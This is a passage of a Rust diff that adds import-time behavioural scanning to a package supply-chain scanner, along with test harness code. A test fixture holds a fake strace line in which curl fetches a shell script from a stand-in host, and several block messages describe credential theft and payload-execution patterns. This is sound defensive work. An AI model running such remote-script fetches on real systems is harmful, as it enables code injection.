@@ -56,6 +56,24 @@ pub(crate) struct PolicyConfig {
     /// allows that binary regardless of the `file -b` output.
     pub artifact_allowlist: HashMap<String, HashSet<String>>,
     pub sensitive_file_access_allowlist: HashMap<String, HashSet<String>>,
+    /// Load each installed package after its install and compare what that does too.
+    pub import_scan: bool,
+    /// Wall-clock limit (seconds) for one import step; a step that exceeds it blocks the package.
+    pub import_timeout_seconds: usize,
+    /// The allowlists for behaviour at import time. An install-time entry never allows
+    /// anything at import time, and the reverse holds too.
+    pub import_allowlists: ImportAllowlists,
+}
+
+/// `PolicyConfig`'s allowlists, again, for behaviour at import time (`import_*` keys).
+#[derive(Default, Clone, Debug)]
+pub(crate) struct ImportAllowlists {
+    pub ip: HashMap<String, HashSet<String>>,
+    pub domain: HashMap<String, HashSet<String>>,
+    pub git_clone: HashMap<String, HashSet<String>>,
+    pub process_exec: HashMap<String, HashSet<String>>,
+    pub artifact: HashMap<String, HashSet<String>>,
+    pub sensitive_file: HashMap<String, HashSet<String>>,
 }
 
 impl Default for PolicyConfig {
@@ -80,6 +98,9 @@ impl Default for PolicyConfig {
             process_exec_allowlist: HashMap::new(),
             artifact_allowlist: HashMap::new(),
             sensitive_file_access_allowlist: HashMap::new(),
+            import_scan: true,
+            import_timeout_seconds: crate::sandbox::DEFAULT_PROBE_TIMEOUT_SECS,
+            import_allowlists: ImportAllowlists::default(),
         }
     }
 }
@@ -143,6 +164,33 @@ struct TraceSignals {
     dns_map: HashMap<String, Vec<IpAddr>>,
     /// Set when the package manager's install command failed inside the probe.
     install_failure: Option<InstallFailure>,
+    /// What loading the installed package did, when the sandbox ran that step.
+    import: Option<Box<ImportSignals>>,
+}
+
+/// The import step of a probe: its own signals (what loading the package did) and how it ended.
+#[derive(Default, Clone)]
+struct ImportSignals {
+    signals: TraceSignals,
+    failure: Option<InstallFailure>,
+    timed_out: bool,
+}
+
+impl TraceSignals {
+    /// Adds what `other` observed, to compare a candidate against several baselines at once.
+    fn absorb(&mut self, other: &TraceSignals) {
+        self.ips.extend(other.ips.iter().cloned());
+        self.git_clone_signatures
+            .extend(other.git_clone_signatures.iter().cloned());
+        self.process_exec_signatures
+            .extend(other.process_exec_signatures.iter().cloned());
+        self.artifact_findings
+            .extend(other.artifact_findings.iter().cloned());
+        self.sensitive_file_reads
+            .extend(other.sensitive_file_reads.iter().cloned());
+        self.dns_map
+            .extend(other.dns_map.iter().map(|(k, v)| (k.clone(), v.clone())));
+    }
 }
 
 #[derive(Clone)]
@@ -1059,6 +1107,20 @@ pub(crate) fn classify_inventory_lines(raw: HashSet<String>) -> HashSet<String> 
     findings
 }
 
+/// Everything the checks look at in one strace output with its artifact inventory appended.
+fn signals_from_trace(full: &str) -> TraceSignals {
+    let trace = strip_artifact_section(full);
+    TraceSignals {
+        ips: extract_connection_ips(trace),
+        git_clone_signatures: extract_git_clone_signatures(trace),
+        process_exec_signatures: extract_process_exec_signatures(trace),
+        artifact_findings: classify_inventory_lines(extract_artifact_findings(full)),
+        sensitive_file_reads: extract_sensitive_file_reads(trace),
+        dns_map: extract_dns_map(trace),
+        ..TraceSignals::default()
+    }
+}
+
 fn trace_sandbox_install_matrix(
     runner: &dyn SandboxRunner,
     manager: &str,
@@ -1069,19 +1131,15 @@ fn trace_sandbox_install_matrix(
 
     for probe_trace in traces {
         let (package, version) = probe_trace.probe;
-        let stderr_str = probe_trace.trace;
-        let trace = strip_artifact_section(&stderr_str);
-        let raw_artifact_lines = extract_artifact_findings(&stderr_str);
-        let artifact_findings = classify_inventory_lines(raw_artifact_lines);
-        let signals = TraceSignals {
-            ips: extract_connection_ips(trace),
-            git_clone_signatures: extract_git_clone_signatures(trace),
-            process_exec_signatures: extract_process_exec_signatures(trace),
-            artifact_findings,
-            sensitive_file_reads: extract_sensitive_file_reads(trace),
-            dns_map: extract_dns_map(trace),
-            install_failure: probe_trace.install_failure,
-        };
+        let mut signals = signals_from_trace(&probe_trace.trace);
+        signals.install_failure = probe_trace.install_failure;
+        signals.import = probe_trace.import.map(|run| {
+            Box::new(ImportSignals {
+                signals: signals_from_trace(&run.trace),
+                failure: run.failure,
+                timed_out: run.timed_out,
+            })
+        });
         by_probe.insert((package, version), signals);
     }
 
@@ -1404,6 +1462,13 @@ fn extract_git_clone_signatures(trace: &str) -> HashSet<String> {
 /// package's own behavior. These are excluded from process-exec signatures
 /// because their argv contains version-specific strings that would always
 /// appear as "new" between versions.
+/// The sandbox's import step is `<interpreter> -c|-e <script> <package>`. It is told apart from a
+/// program the package runs by the script itself, compared in full, so naming a flag or a word
+/// is not enough to look like it.
+fn is_import_probe(flag: &str, script: &str, args: &[String]) -> bool {
+    matches!(args, [f, s, _] if f == flag && s == script)
+}
+
 fn is_harness_command(exe: &str, args: &[String]) -> bool {
     let contains = |needle: &str| args.iter().any(|a| a.contains(needle));
     match exe {
@@ -1417,6 +1482,7 @@ fn is_harness_command(exe: &str, args: &[String]) -> bool {
             // build flag.
             args.len() >= 2 && args[0] == "install" && contains("--prefix")
         }
+        "node" if is_import_probe("-e", crate::sandbox::IMPORT_NODE, args) => true,
         "node" => {
             // node <npm-path> install <pkg>@<ver> --prefix /work --no-save
             // or node <pnpm-path> add <pkg>@<ver> --dir /work --lockfile=false
@@ -1438,7 +1504,8 @@ fn is_harness_command(exe: &str, args: &[String]) -> bool {
                 })
         }
         e if e.starts_with("python") => {
-            contains("get_interpreter_info")
+            is_import_probe("-c", crate::sandbox::IMPORT_PYTHON, args)
+                || contains("get_interpreter_info")
                 || (args
                     .windows(3)
                     .any(|w| w[0] == "-m" && w[1] == "pip" && w[2] == "install")
@@ -2252,6 +2319,390 @@ fn warn_and_block(
     entry.blocked_reasons.push(warning_type.to_string());
 }
 
+/// Blocks `key` for `reason` (printed by the caller).
+fn add_block_reason(
+    results: &mut HashMap<String, ScanReport>,
+    key: &str,
+    resolved_version: &str,
+    reason: &str,
+) {
+    let entry = results
+        .entry(key.to_string())
+        .or_insert_with(|| ScanReport {
+            allowed: false,
+            resolved_version: resolved_version.to_string(),
+            blocked_reasons: vec![],
+        });
+    entry.allowed = false;
+    entry.blocked_reasons.push(reason.to_string());
+}
+
+/// Which step of the probe a set of signals comes from.
+#[derive(Clone, Copy, PartialEq)]
+enum Phase {
+    Install,
+    Import,
+}
+
+impl Phase {
+    /// A config key or block reason of this phase: `import_` is put in front for the import step.
+    fn named(self, base: &str) -> String {
+        match self {
+            Phase::Install => base.to_string(),
+            Phase::Import => format!("import_{base}"),
+        }
+    }
+
+    /// Where a finding's description says it happened.
+    fn when(self) -> &'static str {
+        match self {
+            Phase::Install => "",
+            Phase::Import => " at import time",
+        }
+    }
+}
+
+/// The allowlists that apply to one phase.
+struct AllowlistRefs<'a> {
+    ip: &'a HashMap<String, HashSet<String>>,
+    domain: &'a HashMap<String, HashSet<String>>,
+    git_clone: &'a HashMap<String, HashSet<String>>,
+    process_exec: &'a HashMap<String, HashSet<String>>,
+    artifact: &'a HashMap<String, HashSet<String>>,
+    sensitive_file: &'a HashMap<String, HashSet<String>>,
+}
+
+/// The five behavioural checks for one phase: what the candidate did that no baseline did, minus
+/// what the phase's allowlists permit. Every check runs, so the report names everything found.
+/// Returns whether the package was blocked.
+#[allow(clippy::too_many_arguments)]
+fn check_phase(
+    phase: Phase,
+    results: &mut HashMap<String, ScanReport>,
+    key: &str,
+    plan: &VersionPlan,
+    resolved_version: &str,
+    curr: &TraceSignals,
+    base: &TraceSignals,
+    allow: &AllowlistRefs,
+) -> bool {
+    let when = phase.when();
+    let baseline_label = if plan.baselines.is_empty() {
+        "n/a".to_string()
+    } else {
+        plan.baselines.join(", ")
+    };
+    let mut blocked = false;
+
+    let (new_exec, allowed_exec) = filter_allowlisted_process_exec_signatures(
+        &plan.package,
+        find_new_process_exec_signatures(
+            &curr.process_exec_signatures,
+            &base.process_exec_signatures,
+        ),
+        allow.process_exec,
+    );
+    if !allowed_exec.is_empty() {
+        println!(
+            "ℹ️ [gyrseek] {} ignored new process execution behavior{when} for '{}': {:?}",
+            phase.named("process_exec_allowlist"),
+            plan.package,
+            allowed_exec
+        );
+    }
+    if !new_exec.is_empty() {
+        warn_and_block(
+            results,
+            key,
+            resolved_version,
+            &phase.named("process_exec_anomaly"),
+            &format!(
+                "Package '{}', version '{}' introduced new process execution{when} not seen in baseline versions ({}): {:?}",
+                plan.package, plan.current, baseline_label, new_exec
+            ),
+            Some(
+                "This matches the Shai-Hulud class of attack (download a runtime like Bun and execute a hidden payload).",
+            ),
+        );
+        blocked = true;
+    }
+
+    let (new_reads, _allowed_reads) = filter_allowlisted_sensitive_reads(
+        &plan.package,
+        find_new_sensitive_reads(&curr.sensitive_file_reads, &base.sensitive_file_reads),
+        allow.sensitive_file,
+    );
+    if !new_reads.is_empty() {
+        warn_and_block(
+            results,
+            key,
+            resolved_version,
+            &phase.named("sensitive_file_read_anomaly"),
+            &format!(
+                "Package '{}', version '{}' attempted to access sensitive file(s){when} not seen in baseline versions ({}): {:?}",
+                plan.package, plan.current, baseline_label, new_reads
+            ),
+            Some("This indicates an attempt to steal credentials or configuration files."),
+        );
+        blocked = true;
+    }
+
+    // Files left behind: a suspicious .pth, an unexpected runtime, a binary, a file dropped
+    // outside the install tree (the inventory the sandbox took after the step).
+    let (new_artifacts, allowed_artifacts) = filter_allowlisted_artifact_findings(
+        &plan.package,
+        new_artifact_findings_vs_baseline(&curr.artifact_findings, &base.artifact_findings),
+        allow.artifact,
+    );
+    if !allowed_artifacts.is_empty() {
+        println!(
+            "ℹ️ [gyrseek] {} ignored new artifact finding(s){when} for '{}': {:?}",
+            phase.named("artifact_allowlist"),
+            plan.package,
+            allowed_artifacts
+        );
+    }
+    if !new_artifacts.is_empty() {
+        warn_and_block(
+            results,
+            key,
+            resolved_version,
+            &match phase {
+                Phase::Install => "Suspicious artifact(s) discovered after install".to_string(),
+                Phase::Import => "Suspicious artifact(s) discovered at import time".to_string(),
+            },
+            &format!(
+                "Package '{}', version '{}' introduced new suspicious file artifact(s){when} not seen in baseline versions ({}): {:?}",
+                plan.package, plan.current, baseline_label, new_artifacts
+            ),
+            Some(
+                "This may indicate a .pth file with executable content or an unexpected runtime binary.",
+            ),
+        );
+        blocked = true;
+    }
+
+    let (new_clones, allowed_clones) = filter_allowlisted_git_clone_signatures(
+        &plan.package,
+        find_new_git_clone_signatures(&curr.git_clone_signatures, &base.git_clone_signatures),
+        allow.git_clone,
+    );
+    if !allowed_clones.is_empty() {
+        println!(
+            "ℹ️ [gyrseek] {} ignored new git clone behavior{when} for '{}': {:?}",
+            phase.named("git_clone_allowlist"),
+            plan.package,
+            allowed_clones
+        );
+    }
+    if !new_clones.is_empty() {
+        warn_and_block(
+            results,
+            key,
+            resolved_version,
+            &phase.named("git_clone_anomaly"),
+            &format!(
+                "Package '{}', version '{}' introduced new git clone behavior{when} not seen in baseline versions ({}): {:?}",
+                plan.package, plan.current, baseline_label, new_clones
+            ),
+            None,
+        );
+        blocked = true;
+    }
+
+    let baseline_dns_domains: HashSet<String> = base.dns_map.keys().cloned().collect();
+    let new_connections = find_new_connections_domain_aware(
+        &curr.ips,
+        &base.ips,
+        reverse_dns_domain,
+        &curr.dns_map,
+        &baseline_dns_domains,
+        |d| lookup_host(d).ok(),
+    );
+    let (new_connections, allowed_ips) =
+        filter_allowlisted_new_connections(&plan.package, new_connections, allow.ip);
+    let resolve_endpoint = |ip: &str| -> Option<String> {
+        if is_synthetic_ipv6(ip) {
+            lookup_in_dns_map(ip, &curr.dns_map).map(|s| s.to_string())
+        } else {
+            reverse_dns_domain(ip)
+        }
+    };
+    let (new_connections, allowed_domains) = filter_domain_allowlisted_new_connections_with(
+        &plan.package,
+        new_connections,
+        allow.domain,
+        resolve_endpoint,
+    );
+    if !allowed_ips.is_empty() {
+        println!(
+            "ℹ️ [gyrseek] {} ignored new endpoint(s){when} for '{}': {:?}",
+            phase.named("ip_allowlist"),
+            plan.package,
+            allowed_ips
+        );
+    }
+    if !allowed_domains.is_empty() {
+        println!(
+            "ℹ️ [gyrseek] {} ignored new endpoint(s){when} for '{}': {:?}",
+            phase.named("domain_allowlist"),
+            plan.package,
+            allowed_domains
+        );
+    }
+    if !new_connections.is_empty() {
+        let enriched: Vec<String> = new_connections
+            .iter()
+            .map(|ip| match resolve_endpoint(ip) {
+                Some(d) => format!("{} -> {}", ip, d),
+                None => ip.clone(),
+            })
+            .collect();
+        warn_and_block(
+            results,
+            key,
+            resolved_version,
+            &phase.named("network_anomaly"),
+            &format!(
+                "Package '{}', version '{}' contacted new endpoints{when} not seen in baseline versions ({}): {:?}",
+                plan.package, plan.current, baseline_label, enriched
+            ),
+            None,
+        );
+        blocked = true;
+    }
+    blocked
+}
+
+/// Compares what loading the package did with what loading the baselines did, and decides what
+/// to report when a load did not go through. A load that fails is not a malicious sign by
+/// itself (a missing system library or an optional dependency is enough), so:
+///   - a load that times out, for any version compared, blocks (`import_failed`): its trace is
+///     partial, so there is nothing to compare;
+///   - the candidate failing while a baseline loaded cleanly blocks too, and its trace is
+///     still compared;
+///   - every version failing the same way only warns, with the error, and what was seen up to
+///     the failure is still compared;
+///   - a candidate that loaded, with no baseline that did, has nothing to compare against.
+///
+/// With `compare` false only the failed-load and timeout decisions are made (what a package with
+/// too few baselines still gets: the new-package exemption covers the anomaly checks, not a load
+/// that cannot be completed). Returns whether the package was blocked.
+#[allow(clippy::too_many_arguments)]
+fn check_import(
+    manager: &str,
+    results: &mut HashMap<String, ScanReport>,
+    key: &str,
+    plan: &VersionPlan,
+    resolved_version: &str,
+    candidate: &ImportSignals,
+    baselines: &[(&str, Option<&ImportSignals>)],
+    policy: &PolicyConfig,
+    compare: bool,
+) -> bool {
+    let ran: Vec<(&str, &ImportSignals)> = baselines
+        .iter()
+        .filter_map(|(v, i)| i.map(|i| (*v, i)))
+        .collect();
+    let timed_out: Vec<&str> = std::iter::once((plan.current.as_str(), candidate))
+        .chain(ran.iter().copied())
+        .filter(|(_, i)| i.timed_out)
+        .map(|(v, _)| v)
+        .collect();
+    if !timed_out.is_empty() {
+        println!(
+            "❌ [gyrseek] import_failed: loading '{}' ({}) in the sandbox exceeded import_timeout_seconds={}, so its import-time behaviour could not be compared; treating it as a block.\nIf this is a slow but legitimate import, raise the limit in your gyrseek.yaml (for example `import_timeout_seconds: {}`), or skip import scanning with --no-import-scan.",
+            plan.package,
+            timed_out.join(", "),
+            policy.import_timeout_seconds,
+            policy.import_timeout_seconds.saturating_mul(2)
+        );
+        add_block_reason(results, key, resolved_version, "import_failed");
+        return true;
+    }
+
+    let clean: Vec<&ImportSignals> = ran
+        .iter()
+        .filter(|(_, i)| i.failure.is_none())
+        .map(|(_, i)| *i)
+        .collect();
+    let mut blocked = false;
+    let mut merged = TraceSignals::default();
+    match (&candidate.failure, clean.is_empty()) {
+        (None, true) => {
+            println!(
+                "⚠️ [gyrseek] The baselines of '{}' could not be loaded in the sandbox, so import-time behaviour of {} was not compared.{}",
+                plan.package,
+                plan.current,
+                failure_tails(&ran)
+            );
+            return false;
+        }
+        (None, false) => clean.iter().for_each(|i| merged.absorb(&i.signals)),
+        (Some(f), false) => {
+            println!(
+                "❌ [gyrseek] import_failed: loading '{}' {} in the sandbox failed (exit code {}) although {} loaded cleanly.\n{}\nA package that starts failing to load can be one that broke, or one that ran code before it failed; the trace up to the failure is compared below. If it is a missing optional dependency or system library, it needs resolving on your side or in a custom scanner image; --no-import-scan skips import scanning altogether.",
+                plan.package,
+                plan.current,
+                f.exit_code,
+                ran.iter()
+                    .filter(|(_, i)| i.failure.is_none())
+                    .map(|(v, _)| *v)
+                    .collect::<Vec<_>>()
+                    .join(", "),
+                f.output
+            );
+            add_block_reason(results, key, resolved_version, "import_failed");
+            blocked = true;
+            clean.iter().for_each(|i| merged.absorb(&i.signals));
+        }
+        (Some(f), true) => {
+            println!(
+                "⚠️ [gyrseek] '{}' could not be loaded in the sandbox for any version compared (exit code {} for {}), so import-time behaviour was compared only up to the failure. This is usually a system library or optional dependency the sandbox image lacks, not a problem with the package.\n{}\nTo load it fully, point {} at an image that has it; --no-import-scan skips import scanning.",
+                plan.package,
+                f.exit_code,
+                plan.current,
+                f.output,
+                if is_npm_family_manager(manager) {
+                    "GYRSEEK_NPM_SCANNER_IMAGE"
+                } else {
+                    "GYRSEEK_PY_SCANNER_IMAGE"
+                }
+            );
+            ran.iter().for_each(|(_, i)| merged.absorb(&i.signals));
+        }
+    }
+
+    if !compare {
+        return blocked;
+    }
+    blocked
+        | check_phase(
+            Phase::Import,
+            results,
+            key,
+            plan,
+            resolved_version,
+            &candidate.signals,
+            &merged,
+            &AllowlistRefs {
+                ip: &policy.import_allowlists.ip,
+                domain: &policy.import_allowlists.domain,
+                git_clone: &policy.import_allowlists.git_clone,
+                process_exec: &policy.import_allowlists.process_exec,
+                artifact: &policy.import_allowlists.artifact,
+                sensitive_file: &policy.import_allowlists.sensitive_file,
+            },
+        )
+}
+
+/// What the baselines' failed loads said, for the message that says they were not compared.
+fn failure_tails(ran: &[(&str, &ImportSignals)]) -> String {
+    ran.iter()
+        .filter_map(|(v, i)| i.failure.as_ref().map(|f| format!("\n{v}: {}", f.output)))
+        .collect()
+}
+
 pub(crate) async fn scan_packages_versions(
     runner: &dyn SandboxRunner,
     manager: &str,
@@ -2501,33 +2952,16 @@ pub(crate) async fn scan_packages_versions(
             .iter()
             .map(|f| (plan.current.clone(), f.clone()))
             .collect();
-        let ips_curr = current_signals.ips;
-        let git_curr = current_signals.git_clone_signatures;
-        let proc_curr = current_signals.process_exec_signatures;
-        let artifact_curr = current_signals.artifact_findings.clone();
-        let sensitive_curr = current_signals.sensitive_file_reads;
-        let dns_curr = current_signals.dns_map.clone();
-
-        let mut baseline_ips = HashSet::new();
-        let mut baseline_git_clone_signatures = HashSet::new();
-        let mut baseline_process_exec_signatures = HashSet::new();
-        let mut baseline_artifact_findings = HashSet::new();
-        let mut baseline_sensitive_reads = HashSet::new();
-        let mut baseline_dns_domains = HashSet::new();
+        let mut baseline = TraceSignals::default();
+        let mut baseline_imports: Vec<(&str, Option<&ImportSignals>)> = Vec::new();
         let mut missing = false;
 
         for v in &plan.baselines {
             let k = (plan.package.clone(), v.clone());
             match traces_by_probe.get(&k) {
                 Some(found) => {
-                    baseline_ips.extend(found.ips.iter().cloned());
-                    baseline_git_clone_signatures
-                        .extend(found.git_clone_signatures.iter().cloned());
-                    baseline_process_exec_signatures
-                        .extend(found.process_exec_signatures.iter().cloned());
-                    baseline_artifact_findings.extend(found.artifact_findings.iter().cloned());
-                    baseline_sensitive_reads.extend(found.sensitive_file_reads.iter().cloned());
-                    baseline_dns_domains.extend(found.dns_map.keys().cloned());
+                    baseline.absorb(found);
+                    baseline_imports.push((v.as_str(), found.import.as_deref()));
                     if let Some(f) = &found.install_failure {
                         install_failures.push((v.clone(), f.clone()));
                     }
@@ -2573,6 +3007,23 @@ pub(crate) async fn scan_packages_versions(
             && plan.baselines.len() < plan.baseline_threshold
             && !candidate_failed_alone
         {
+            // The exemption skips the anomaly checks. A load that timed out or failed where a
+            // baseline loaded cleanly is not an anomaly check, so it still blocks.
+            if let Some(candidate) = current_signals.import.as_deref()
+                && check_import(
+                    manager,
+                    &mut results,
+                    &key,
+                    &plan,
+                    &resolved_version,
+                    candidate,
+                    &baseline_imports,
+                    policy,
+                    false,
+                )
+            {
+                continue;
+            }
             println!(
                 "⚠️ [gyrseek] New package exemption applied for '{}': only {} eligible baseline version(s) available (<{}). Skipping anomaly block for now.",
                 plan.package,
@@ -2590,226 +3041,36 @@ pub(crate) async fn scan_packages_versions(
             continue;
         }
 
-        let new_process_exec_signatures =
-            find_new_process_exec_signatures(&proc_curr, &baseline_process_exec_signatures);
-        let (new_process_exec_signatures, allowlisted_process_exec_signatures) =
-            filter_allowlisted_process_exec_signatures(
-                &plan.package,
-                new_process_exec_signatures,
-                &policy.process_exec_allowlist,
-            );
-
-        if !allowlisted_process_exec_signatures.is_empty() {
-            println!(
-                "ℹ️ [gyrseek] process_exec_allowlist ignored new process execution behavior for '{}': {:?}",
-                plan.package, allowlisted_process_exec_signatures
-            );
-        }
-
-        let mut package_blocked = false;
-
-        if !new_process_exec_signatures.is_empty() {
-            let baseline_label = if plan.baselines.is_empty() {
-                "n/a".to_string()
-            } else {
-                plan.baselines.join(", ")
-            };
-
-            warn_and_block(
-                &mut results,
-                &key,
-                &resolved_version,
-                "process_exec_anomaly",
-                &format!(
-                    "Package '{}', version '{}' introduced new process execution not seen in baseline versions ({}): {:?}",
-                    plan.package, plan.current, baseline_label, new_process_exec_signatures
-                ),
-                Some(
-                    "This matches the Shai-Hulud class of attack (download a runtime like Bun and execute a hidden payload).",
-                ),
-            );
-            package_blocked = true;
-        }
-
-        let new_sensitive_reads =
-            find_new_sensitive_reads(&sensitive_curr, &baseline_sensitive_reads);
-        let (blocked_sensitive_reads, _allowed_sensitive_reads) =
-            filter_allowlisted_sensitive_reads(
-                &plan.package,
-                new_sensitive_reads,
-                &policy.sensitive_file_access_allowlist,
-            );
-
-        if !blocked_sensitive_reads.is_empty() {
-            let baseline_label = if plan.baselines.is_empty() {
-                "n/a".to_string()
-            } else {
-                plan.baselines.join(", ")
-            };
-
-            warn_and_block(
-                &mut results,
-                &key,
-                &resolved_version,
-                "sensitive_file_read_anomaly",
-                &format!(
-                    "Package '{}', version '{}' attempted to access sensitive file(s) not seen in baseline versions ({}): {:?}",
-                    plan.package, plan.current, baseline_label, blocked_sensitive_reads
-                ),
-                Some("This indicates an attempt to steal credentials or configuration files."),
-            );
-            package_blocked = true;
-        }
-
-        // Post-install artifact check — suspicious .pth files with executable
-        // content, unexpected runtime binaries, and other file-level IoCs that
-        // are identified by the in-container artifact scan (written to disk
-        // during install, captured before the container exits).
-        let new_artifact_findings =
-            new_artifact_findings_vs_baseline(&artifact_curr, &baseline_artifact_findings);
-        let (new_artifact_findings, allowlisted_artifact_findings) =
-            filter_allowlisted_artifact_findings(
-                &plan.package,
-                new_artifact_findings,
-                &policy.artifact_allowlist,
-            );
-
-        if !allowlisted_artifact_findings.is_empty() {
-            println!(
-                "ℹ️ [gyrseek] artifact_allowlist ignored new artifact finding(s) for '{}': {:?}",
-                plan.package, allowlisted_artifact_findings
-            );
-        }
-
-        if !new_artifact_findings.is_empty() {
-            let baseline_label = if plan.baselines.is_empty() {
-                "n/a".to_string()
-            } else {
-                plan.baselines.join(", ")
-            };
-
-            warn_and_block(
-                &mut results,
-                &key,
-                &resolved_version,
-                "Suspicious artifact(s) discovered after install",
-                &format!(
-                    "Package '{}', version '{}' introduced new suspicious file artifact(s) not seen in baseline versions ({}): {:?}",
-                    plan.package, plan.current, baseline_label, new_artifact_findings
-                ),
-                Some(
-                    "This may indicate a .pth file with executable content or an unexpected runtime binary.",
-                ),
-            );
-            package_blocked = true;
-        }
-
-        let new_git_clone_signatures =
-            find_new_git_clone_signatures(&git_curr, &baseline_git_clone_signatures);
-        let (new_git_clone_signatures, allowlisted_git_clone_signatures) =
-            filter_allowlisted_git_clone_signatures(
-                &plan.package,
-                new_git_clone_signatures,
-                &policy.git_clone_allowlist,
-            );
-
-        if !allowlisted_git_clone_signatures.is_empty() {
-            println!(
-                "ℹ️ [gyrseek] git_clone_allowlist ignored new git clone behavior for '{}': {:?}",
-                plan.package, allowlisted_git_clone_signatures
-            );
-        }
-
-        if !new_git_clone_signatures.is_empty() {
-            let baseline_label = if plan.baselines.is_empty() {
-                "n/a".to_string()
-            } else {
-                plan.baselines.join(", ")
-            };
-
-            warn_and_block(
-                &mut results,
-                &key,
-                &resolved_version,
-                "git_clone_anomaly",
-                &format!(
-                    "Package '{}', version '{}' introduced new git clone behavior not seen in baseline versions ({}): {:?}",
-                    plan.package, plan.current, baseline_label, new_git_clone_signatures
-                ),
-                None,
-            );
-            package_blocked = true;
-        }
-
-        let new_connections = find_new_connections_domain_aware(
-            &ips_curr,
-            &baseline_ips,
-            reverse_dns_domain,
-            &dns_curr,
-            &baseline_dns_domains,
-            |d| lookup_host(d).ok(),
+        let mut package_blocked = check_phase(
+            Phase::Install,
+            &mut results,
+            &key,
+            &plan,
+            &resolved_version,
+            &current_signals,
+            &baseline,
+            &AllowlistRefs {
+                ip: &policy.ip_allowlist,
+                domain: &policy.domain_allowlist,
+                git_clone: &policy.git_clone_allowlist,
+                process_exec: &policy.process_exec_allowlist,
+                artifact: &policy.artifact_allowlist,
+                sensitive_file: &policy.sensitive_file_access_allowlist,
+            },
         );
-        let (new_connections, allowlisted_connections) = filter_allowlisted_new_connections(
-            &plan.package,
-            new_connections,
-            &policy.ip_allowlist,
-        );
-        let resolve_endpoint = |ip: &str| -> Option<String> {
-            if is_synthetic_ipv6(ip) {
-                lookup_in_dns_map(ip, &dns_curr).map(|s| s.to_string())
-            } else {
-                reverse_dns_domain(ip)
-            }
-        };
 
-        let (new_connections, allowlisted_domain_connections) =
-            filter_domain_allowlisted_new_connections_with(
-                &plan.package,
-                new_connections,
-                &policy.domain_allowlist,
-                resolve_endpoint,
-            );
-
-        if !allowlisted_connections.is_empty() {
-            println!(
-                "ℹ️ [gyrseek] IP allowlist ignored new endpoint(s) for '{}': {:?}",
-                plan.package, allowlisted_connections
-            );
-        }
-        if !allowlisted_domain_connections.is_empty() {
-            println!(
-                "ℹ️ [gyrseek] Domain allowlist ignored new endpoint(s) for '{}': {:?}",
-                plan.package, allowlisted_domain_connections
-            );
-        }
-
-        if !new_connections.is_empty() {
-            let baseline_label = if plan.baselines.is_empty() {
-                "n/a".to_string()
-            } else {
-                plan.baselines.join(", ")
-            };
-
-            let enriched: Vec<String> = new_connections
-                .iter()
-                .map(|ip| match resolve_endpoint(ip) {
-                    Some(d) => format!("{} -> {}", ip, d),
-                    None => ip.clone(),
-                })
-                .collect();
-
-            warn_and_block(
+        if let Some(candidate) = current_signals.import.as_deref() {
+            package_blocked |= check_import(
+                manager,
                 &mut results,
                 &key,
+                &plan,
                 &resolved_version,
-                "network_anomaly",
-                &format!(
-                    "Package '{}', version '{}' contacted new endpoints not seen in baseline versions ({}): {:?}",
-                    plan.package, plan.current, baseline_label, enriched
-                ),
-                None,
+                candidate,
+                &baseline_imports,
+                policy,
+                true,
             );
-            package_blocked = true;
         }
 
         if package_blocked || candidate_failed_alone {
@@ -5638,6 +5899,7 @@ read(6, "\x00\x44\x00\x00\x81\x80\x00\x01\x00\x02\x00\x00\x00\x00\x03\x66\x6f\x6
                         probe: probe.clone(),
                         trace: trace.clone(),
                         install_failure: None,
+                        import: None,
                     });
                 }
             }
@@ -8442,5 +8704,412 @@ recvmsg(6, {msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\x00\x44\x00\x00\x
         let ip_strs: Vec<String> = ips.iter().map(|ip| ip.to_string()).collect();
         assert!(ip_strs.contains(&"140.248.144.223".to_string()));
         assert!(ip_strs.contains(&"2a04:4e42:94::223".to_string()));
+    }
+
+    // ---------------------------------------------------------------------------
+    // Import-time scanning: loading the installed package after the install
+    // ---------------------------------------------------------------------------
+
+    const QUIET: &str = "execve(\"/usr/bin/sh\", [\"sh\", \"-c\", \"echo ok\"], 0x7ff) = 0\n";
+    const CURL: &str =
+        "execve(\"/usr/bin/curl\", [\"curl\", \"https://x.example/p.sh\"], 0x7ff) = 0\n";
+
+    /// Every probe installs quietly; what loading the package did is given per version.
+    struct ImportingRunner {
+        imports: HashMap<String, crate::sandbox::ImportRun>,
+    }
+
+    impl crate::sandbox::SandboxRunner for ImportingRunner {
+        fn trace_install(&self, _: &str, _: &str, _: &str) -> Result<String, String> {
+            Ok(QUIET.to_string())
+        }
+
+        fn trace_install_matrix(
+            &self,
+            _: &str,
+            probes: &[(String, String)],
+        ) -> Result<Vec<crate::sandbox::ProbeTrace>, String> {
+            Ok(probes
+                .iter()
+                .map(|probe| crate::sandbox::ProbeTrace {
+                    probe: probe.clone(),
+                    trace: QUIET.to_string(),
+                    install_failure: None,
+                    import: self.imports.get(&probe.1).cloned(),
+                })
+                .collect())
+        }
+    }
+
+    fn loaded(trace: &str) -> crate::sandbox::ImportRun {
+        crate::sandbox::ImportRun {
+            trace: trace.to_string(),
+            failure: None,
+            timed_out: false,
+        }
+    }
+
+    fn load_failed(trace: &str) -> crate::sandbox::ImportRun {
+        crate::sandbox::ImportRun {
+            failure: Some(crate::sandbox::InstallFailure {
+                exit_code: 1,
+                output: "ImportError: libpq.so.5: cannot open shared object file".to_string(),
+            }),
+            ..loaded(trace)
+        }
+    }
+
+    fn load_timed_out() -> crate::sandbox::ImportRun {
+        crate::sandbox::ImportRun {
+            timed_out: true,
+            ..loaded("")
+        }
+    }
+
+    /// Scans `pkg` 2.0.0 against 1.9.0 and 1.8.0 with the given import runs
+    /// (`[candidate, baseline, baseline]`; `None` = the import did not run).
+    async fn scan_with_imports(
+        runs: [Option<crate::sandbox::ImportRun>; 3],
+        policy: PolicyConfig,
+    ) -> super::ScanReport {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+        let runner = ImportingRunner {
+            imports: ["2.0.0", "1.9.0", "1.8.0"]
+                .iter()
+                .zip(runs)
+                .filter_map(|(v, run)| run.map(|r| (v.to_string(), r)))
+                .collect(),
+        };
+        let policy = PolicyConfig {
+            baseline_count: 2,
+            baseline_overrides: HashMap::from([(
+                "pkg".to_string(),
+                (Some("1.9.0".to_string()), Some("1.8.0".to_string())),
+            )]),
+            ..policy
+        };
+        scan_packages_versions(
+            &runner,
+            "pip",
+            &[("pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await
+        .remove("pkg|2.0.0")
+        .expect("should have result")
+    }
+
+    #[tokio::test]
+    async fn a_process_started_only_when_the_package_loads_is_flagged_at_import_time() {
